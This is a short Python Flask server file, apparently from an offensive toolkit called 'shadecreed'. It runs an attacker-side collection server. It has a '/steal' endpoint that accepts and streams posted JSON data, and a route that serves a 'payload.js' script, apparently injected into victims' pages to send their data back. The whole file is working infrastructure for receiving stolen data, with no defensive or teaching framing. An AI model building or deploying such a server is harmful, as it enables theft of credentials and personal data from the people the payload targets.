from flask import Flask,request,jsonify,send_file
import os,sys,traceback

module_path = os.path.abspath(os.path.dirname(os.path.join(__file__,'..','..')))
if not module_path in sys.path:
  sys.path.insert(0, module_path)
  
from shadecreed.core.middleware.schedule import taskSchedule
from shadecreed.ux.anime import wr
from shadecreed.ux.process import streamData
app = Flask(__name__)

schedule = taskSchedule()
@app.route('/steal', methods=['POST'])
def steal():
  try:
    data = request.get_json()
    if data:
        streamer = streamData(data)
        schedule.add_task(streamer.streaming)
        return jsonify({'status': 'success'}), 201
    else:
      return jsonify({'status': 'no data provided'}), 400
  except Exception as e:
    traceback.print_exc()
    return jsonify({'status':'error','message':str(e)}),500

@app.route('/payload.js')
def payload():
  send_file('static/payload.js',mimetype='application/javascript')
if __name__==('__main__'):
  try:
    if sys.argv[1]:
      use = int(sys.argv[1])
  except IndexError:
    use = 5000
  app.run('0.0.0.0',port=use, debug = False)
  